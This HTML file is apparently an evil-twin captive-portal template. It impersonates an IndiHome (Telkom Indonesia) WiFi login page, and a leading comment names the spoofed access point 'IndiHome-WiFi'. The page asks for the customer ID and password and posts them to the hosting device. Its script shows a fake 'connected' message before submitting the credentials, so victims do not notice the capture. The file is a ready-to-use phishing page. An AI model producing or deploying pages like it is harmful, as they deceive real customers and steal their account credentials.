<!-- AP="IndiHome-WiFi" -->
<!DOCTYPE html>
<html>
<head>
  <title>IndiHome - WiFi Login</title>
  <meta charset='UTF-8'>
  <meta name='viewport' content='width=device-width, initial-scale=1.0'>
  <style>
    body{font-family: 'Segoe UI', Arial, sans-serif;background:linear-gradient(135deg,#e80000 0%,#cc0000 50%,#990000 100%);margin:0;padding:0;min-height:100vh;display:flex;align-items:center;justify-content:center;}
    .card{background:#fff;border-radius:16px;padding:40px 32px;max-width:400px;width:90%;box-shadow:0 20px 60px rgba(0,0,0,0.3);}
    .logo{text-align:center;margin-bottom:24px;}
    .logo svg{width:180px;}
    h1{color:#1a1a1a;font-size:20px;text-align:center;margin-bottom:4px;}
    .subtitle{color:#666;font-size:14px;text-align:center;margin-bottom:24px;}
    .input-group{margin-bottom:16px;}
    .input-group label{display:block;font-size:13px;color:#333;margin-bottom:4px;font-weight:600;}
    .input-group input{width:100%;padding:12px 14px;border:2px solid #e0e0e0;border-radius:8px;font-size:15px;box-sizing:border-box;transition:border-color .2s;}
    .input-group input:focus{border-color:#e80000;outline:none;}
    .btn{background:#e80000;color:#fff;border:none;border-radius:8px;padding:14px;font-size:16px;font-weight:700;width:100%;cursor:pointer;transition:background .2s;}
    .btn:hover{background:#cc0000;}
    .info{text-align:center;font-size:12px;color:#999;margin-top:16px;line-height:1.5;}
    .info a{color:#e80000;text-decoration:none;}
    #form-block{display:block;}
    #success-block{display:none;text-align:center;padding:30px 0;}
    #success-block .check{font-size:48px;color:#4caf50;}
    #success-block p{color:#333;font-size:16px;margin-top:12px;}
    .loader{width:40px;height:40px;border:4px solid #f3f3f3;border-top:4px solid #e80000;border-radius:50%;animation:spin 1s linear infinite;margin:20px auto;}
    @keyframes spin{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}
    .red-dot{width:10px;height:10px;background:#4caf50;border-radius:50%;display:inline-block;margin-right:6px;}
    .signal-info{background:#f9f9f9;border-radius:8px;padding:10px 14px;margin-bottom:20px;font-size:13px;color:#555;display:flex;align-items:center;justify-content:space-between;}
  </style>
</head>
<body>
  <div class="card">
    <div class="logo">
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 300 80">
        <rect x="0" y="0" width="300" height="80" rx="8" fill="#e80000"/>
        <text x="150" y="48" text-anchor="middle" fill="white" font-size="28" font-weight="bold" font-family="Arial">IndiHome</text>
        <text x="150" y="68" text-anchor="middle" fill="#ffcccc" font-size="11" font-family="Arial">by Telkom Indonesia</text>
      </svg>
    </div>
    <div class="signal-info">
      <span><span class="red-dot"></span>Connected to IndiHome WiFi</span>
      <span>Signal: ▂▄▆█</span>
    </div>
    <div id="form-block">
      <h1>Masuk untuk akses internet</h1>
      <p class="subtitle">Gunakan akun MyIndiHome atau nomor pelanggan</p>
      <form action='/post' id='login-form'>
        <div class="input-group">
          <label>Nomor Pelanggan / ID IndiHome</label>
          <input name='username' type='text' placeholder='Contoh: 1234567890' required>
        </div>
        <div class="input-group">
          <label>Password</label>
          <input name='password' type='password' placeholder='Masukkan password' required>
        </div>
        <button class="btn" type="submit">Masuk</button>
      </form>
      <div class="info">
        <p>Lupa password? Hubungi <a href="#">Call Center 188</a></p>
        <p>Dengan masuk, Anda menyetujui <a href="#">Syarat & Ketentuan</a> IndiHome</p>
      </div>
    </div>
    <div id="success-block">
      <div class="check">✓</div>
      <p>Berhasil terhubung!</p>
      <p style="font-size:14px;color:#666;">Anda akan diarahkan dalam beberapa detik...</p>
      <div class="loader"></div>
    </div>
  </div>
  <script>
    document.getElementById('login-form').addEventListener('submit', function(e) {
      e.preventDefault();
      document.getElementById('form-block').style.display = 'none';
      document.getElementById('success-block').style.display = 'block';
      setTimeout(function() { document.getElementById('login-form').submit(); }, 3000);
    });
  </script>
</body>
</html>
